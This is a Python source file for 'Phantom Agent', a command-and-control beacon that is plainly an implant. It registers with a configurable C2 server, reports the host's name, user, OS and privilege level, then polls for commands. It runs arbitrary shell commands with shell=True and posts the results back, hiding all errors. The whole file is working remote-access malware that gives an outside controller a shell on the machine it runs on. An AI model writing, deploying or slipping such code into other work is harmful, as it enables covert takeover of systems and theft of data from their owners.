"""Phantom Agent — stdlib only, poll-based C2 beacon."""
import os, sys, json, time, platform, socket, subprocess, base64, traceback
from urllib.request import Request, urlopen
from urllib.parse import urlencode

C2_URL = sys.argv[sys.argv.index('--c2') + 1] if '--c2' in sys.argv else os.environ.get('C2_URL', 'http://localhost:8080').rstrip('/')
POLL_INTERVAL = int(sys.argv[sys.argv.index('--poll') + 1]) if '--poll' in sys.argv else int(os.environ.get('POLL_INTERVAL', 5)) 
AGENT_ID = None

def send(path, payload):
    try:
        data = json.dumps(payload).encode()
        req = Request(C2_URL + path, data=data, headers={'Content-Type': 'application/json'})
        urlopen(req, timeout=10)
    except Exception:
        pass

def register():
    global AGENT_ID
    payload = {
        'hostname': platform.node(),
        'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        'os': platform.system() + ' ' + platform.release(),
        'arch': platform.machine(),
        'privileges': 'admin' if os.name == 'nt' else 'root' if hasattr(os, 'geteuid') and os.geteuid() == 0 else 'user',
        'pid': os.getpid()
    }
    send('/register', payload)
    # Read assigned id
    try:
        body = json.dumps(payload).encode()
        req = Request(C2_URL + '/register', data=body, headers={'Content-Type': 'application/json'})
        with urlopen(req, timeout=10) as r:
            assigned = json.loads(r.read())
            AGENT_ID = assigned.get('id', 'phantom')
    except Exception:
        AGENT_ID = 'phantom'

def run_shell(args):
    try:
        cmd = args[0] if args else 'whoami'
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60, text=True, errors='replace')
        return {'output': out, 'type': 'shell'}
    except subprocess.CalledProcessError as e:
        return {'output': e.output, 'error': str(e), 'type': 'shell'}
    except Exception as e:
        return {'output': '', 'error': str(e), 'type': 'shell'}

def run_recon(_):
    info = {
        'hostname': platform.node(),
        'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        'os': platform.system() + ' ' + platform.release(),
        'arch': platform.machine(),
        'privileges': 'admin' if os.name == 'nt' else 'root' if hasattr(os, 'geteuid') and os.geteuid() == 0 else 'user',
        'pid': os.getpid(),
        'cwd': os.getcwd()
    }
    return {'output': json.dumps(info, indent=2), 'type': 'recon'}

MODULE_HANDLERS = {
    'shell': run_shell,
    'recon': run_recon,
}

def execute(cmd):
    c = cmd.get('cmd')
    if c == 'module':
        name = cmd.get('module')
        handler = MODULE_HANDLERS.get(name)
        if handler:
            return handler(cmd.get('args', []))
        return {'status': f'module {name} stub', 'type': 'module'}
    if c == 'shell':
        return run_shell(cmd.get('args', ['whoami']))
    if c == 'recon':
        return run_recon(cmd.get('args', []))
    return {'status': 'unknown', 'type': 'unknown'}

def poll():
    global AGENT_ID
    if not AGENT_ID:
        register()
    while True:
        try:
            req = Request(C2_URL + f'/api/agent/{AGENT_ID}/poll')
            with urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            for cid, cmd in data.get('commands', {}).items():
                result = execute(cmd)
                send(f'/api/agent/{AGENT_ID}/result/{cid}', result)
                time.sleep(0.3)
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == '__main__':
    register()
    try:
        poll()
    except KeyboardInterrupt:
        sys.exit(0)
